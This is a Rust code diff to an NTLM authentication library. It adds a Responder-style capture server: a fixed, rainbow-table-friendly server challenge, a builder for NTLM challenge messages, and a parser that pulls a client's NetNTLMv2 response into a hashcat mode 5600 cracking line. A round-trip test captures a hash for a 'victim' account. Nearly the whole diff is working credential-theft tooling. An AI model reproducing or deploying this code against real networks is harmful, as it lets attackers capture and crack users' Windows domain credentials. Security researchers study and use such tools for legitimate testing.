@@ -265,6 +265,101 @@ fn ntlmv2_response(
 
 const VERSION: [u8; 8] = [6, 1, 0, 0, 0, 0, 0, 15]; // Windows 7, NTLMSSP rev 15
 
+// ---- server side: NTLM capture (Responder-style) --------------------------
+
+/// The classic fixed server challenge — makes captured NetNTLMv2 hashes usable with
+/// precomputed/rainbow attacks and is the Responder default.
+pub const CAPTURE_CHALLENGE: [u8; 8] = [0x11, 0x22, 0x33, 0x44, 0x55, 0x66, 0x77, 0x88];
+
+/// Build an NTLM CHALLENGE (Type 2) advertising our server challenge and a synthetic target
+/// info. The client's NTLMv2 proof is computed over this, so any well-formed target info
+/// yields a crackable hash (hashcat recomputes over the echoed blob).
+pub fn build_challenge(server_challenge: &[u8; 8], netbios: &str) -> Vec<u8> {
+    let target = utf16le(netbios);
+    // Target info AV pairs: NbDomainName(2), NbComputerName(1), DnsDomainName(4),
+    // DnsComputerName(3), Timestamp(7), EOL(0).
+    let mut ti = Vec::new();
+    let mut av = |id: u16, val: &[u8], ti: &mut Vec<u8>| {
+        ti.extend_from_slice(&id.to_le_bytes());
+        ti.extend_from_slice(&(val.len() as u16).to_le_bytes());
+        ti.extend_from_slice(val);
+    };
+    av(2, &target, &mut ti);
+    av(1, &target, &mut ti);
+    av(4, &target, &mut ti);
+    av(3, &target, &mut ti);
+    av(7, &now_filetime().to_le_bytes(), &mut ti);
+    ti.extend_from_slice(&[0, 0, 0, 0]); // MsvAvEOL
+
+    let f = flags::NEGOTIATE_UNICODE
+        | flags::REQUEST_TARGET
+        | flags::NEGOTIATE_NTLM
+        | flags::NEGOTIATE_ALWAYS_SIGN
+        | flags::NEGOTIATE_EXTENDED_SESSIONSECURITY
+        | flags::NEGOTIATE_TARGET_INFO
+        | flags::NEGOTIATE_VERSION
+        | 0x0001_0000 // TARGET_TYPE_DOMAIN
+        | flags::NEGOTIATE_128
+        | flags::NEGOTIATE_56;
+
+    // Header: sig(8)+type(4)+TargetNameFields(8)+flags(4)+challenge(8)+reserved(8)
+    //         +TargetInfoFields(8)+version(8) = 56.
+    const HEADER: u32 = 56;
+    let name_off = HEADER;
+    let ti_off = HEADER + target.len() as u32;
+    let mut m = Vec::new();
+    m.extend_from_slice(b"NTLMSSP\0");
+    m.extend_from_slice(&2u32.to_le_bytes());
+    let field = |len: usize, off: u32| {
+        let mut f = [0u8; 8];
+        f[0..2].copy_from_slice(&(len as u16).to_le_bytes());
+        f[2..4].copy_from_slice(&(len as u16).to_le_bytes());
+        f[4..8].copy_from_slice(&off.to_le_bytes());
+        f
+    };
+    m.extend_from_slice(&field(target.len(), name_off));
+    m.extend_from_slice(&f.to_le_bytes());
+    m.extend_from_slice(server_challenge);
+    m.extend_from_slice(&[0u8; 8]); // Reserved
+    m.extend_from_slice(&field(ti.len(), ti_off));
+    m.extend_from_slice(&VERSION);
+    debug_assert_eq!(m.len() as u32, HEADER);
+    m.extend_from_slice(&target);
+    m.extend_from_slice(&ti);
+    m
+}
+
+/// Parse an AUTHENTICATE (Type 3) and format the NetNTLMv2 for hashcat `-m 5600`:
+/// `user::domain:serverChallenge:NTProofStr:blob`.
+pub fn netntlmv2_from_type3(type3: &[u8], server_challenge: &[u8; 8]) -> Option<String> {
+    if type3.len() < 64 || &type3[0..8] != b"NTLMSSP\0" || u32le(type3, 8) != 3 {
+        return None;
+    }
+    let field = |off: usize| -> Option<&[u8]> {
+        let len = u16le(type3, off) as usize;
+        let o = u32le(type3, off + 4) as usize;
+        type3.get(o..o + len)
+    };
+    let nt = field(20)?; // NtChallengeResponse
+    let domain = field(28)?;
+    let user = field(36)?;
+    if nt.len() < 16 {
+        return None; // NTLMv1 or empty — not v2
+    }
+    let wide = |b: &[u8]| -> String {
+        String::from_utf16_lossy(&b.chunks_exact(2).map(|c| u16::from_le_bytes([c[0], c[1]])).collect::<Vec<_>>())
+    };
+    let hex = |b: &[u8]| b.iter().map(|x| format!("{x:02x}")).collect::<String>();
+    Some(format!(
+        "{}::{}:{}:{}:{}",
+        wide(user),
+        wide(domain),
+        hex(server_challenge),
+        hex(&nt[0..16]),  // NTProofStr
+        hex(&nt[16..]),   // blob (temp)
+    ))
+}
+
 /// NTLM client: holds the NEGOTIATE message so the MIC can bind all three messages.
 pub struct Ntlm {
     type1: Vec<u8>,
@@ -483,6 +578,26 @@ mod tests {
 
     fn hex(b: &[u8]) -> String {
         b.iter().map(|x| format!("{x:02x}")).collect()
+    }
+
+    // Server builds a CHALLENGE, our client authenticates to it, and the server extracts the
+    // NetNTLMv2 — a full capture round-trip with the fixed challenge.
+    #[test]
+    fn capture_roundtrip_netntlmv2() {
+        let chal = build_challenge(&CAPTURE_CHALLENGE, "CORP");
+        assert_eq!(&chal[0..8], b"NTLMSSP\0");
+        assert_eq!(u32le(&chal, 8), 2); // Type 2
+        let ntlm = Ntlm::new();
+        let (type3, _key) = ntlm.authenticate(&chal, "CORP", "victim", "S3cret!", "WS01").unwrap();
+        let line = netntlmv2_from_type3(&type3, &CAPTURE_CHALLENGE).expect("extract v2");
+        // hashcat 5600: user::domain:serverchal:ntproofstr:blob
+        let parts: Vec<&str> = line.split(':').collect();
+        assert_eq!(parts[0], "victim");
+        assert_eq!(parts[1], ""); // the "::" separator
+        assert_eq!(parts[2], "CORP");
+        assert_eq!(parts[3], "1122334455667788"); // our server challenge
+        assert_eq!(parts[4].len(), 32); // NTProofStr = 16 bytes hex
+        assert!(parts[5].len() > 32); // blob
     }
 
     // RC4 known-answer (RFC 6229 / classic "Key"/"Plaintext" test vector).
